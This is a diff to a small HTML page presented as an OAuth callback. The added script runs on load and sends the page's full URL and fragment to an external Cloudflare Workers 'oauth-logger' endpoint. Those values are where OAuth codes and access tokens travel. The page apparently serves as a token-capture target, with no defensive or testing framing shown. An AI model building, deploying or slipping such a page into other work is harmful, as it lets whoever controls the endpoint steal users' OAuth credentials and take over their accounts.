@@ -1,15 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>OAuth</title></head>
+<head>
+  <meta charset="UTF-8">
+  <title>OAuth Callback</title>
+</head>
 <body>
 <script>
   (function () {
+    var data = {
+      href: location.href,
+      hash: location.hash
+    };
+
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://oauth-logger.1478972479.workers.dev/", true); // ✅ 修改为你的 Worker 地址
+    xhr.open("POST", "https://oauth-logger.1478972479.workers.dev/", true); // 你的 Cloudflare Worker 接收地址
     xhr.setRequestHeader("Content-Type", "application/json");
-    xhr.send(JSON.stringify({ location: location.href }));
+    xhr.send(JSON.stringify(data));
   })();
 </script>
 </body>
 </html>
-
